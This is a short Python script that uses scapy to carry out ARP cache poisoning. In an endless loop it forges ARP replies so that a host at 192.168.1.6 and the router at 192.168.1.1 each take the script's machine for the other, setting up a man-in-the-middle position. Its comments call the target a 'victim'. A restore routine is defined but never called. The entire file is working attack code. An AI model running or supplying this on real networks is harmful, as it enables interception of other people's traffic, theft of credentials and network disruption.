#! /bin/python3
import scapy.all as scapy
import time


def getMacAddress(ip):  # returns mac address of the ip
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast / arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    return answeredList[0][1].hwsrc


def spoof(targetIP, spoofIP):
    targetMAC = getMacAddress(targetIP)
    print(f"Target MAC found: {targetMAC} of IP: {targetIP}")
    packet = scapy.ARP(
        op=2,
        pdst=targetIP,
        hwdst=targetMAC,
        psrc=spoofIP
        # saying to victim that I am the router by keeping the source ip as router ip... => Fake Poisoning
        # if op = 1 na it is request packet and op = 2 na then it is response packet
    )
    scapy.send(packet)


def restore(destinationIP, sourceIP):
    destinationMAC = getMacAddress(destinationIP)
    sourceMAC = getMacAddress(sourceIP)
    packet = scapy.ARP(
        op=2,
        pdst=destinationIP,
        hwdst=destinationMAC,
        psrc=sourceIP,
        hwsrc=sourceMAC
        # saying to victim that I am the router by keeping the source ip as router ip... => Fake Poisoning
        # if op = 1 na it is request packet and op = 2 na then it is response packet
    )
    scapy.send(packet, count=4, verbose=False)


while True:
    spoof("192.168.1.6", "192.168.1.1")  # Telli ng target I am the router
    spoof("192.168.1.1", "192.168.1.6")  # Telling router I am the target
    time.sleep(2)
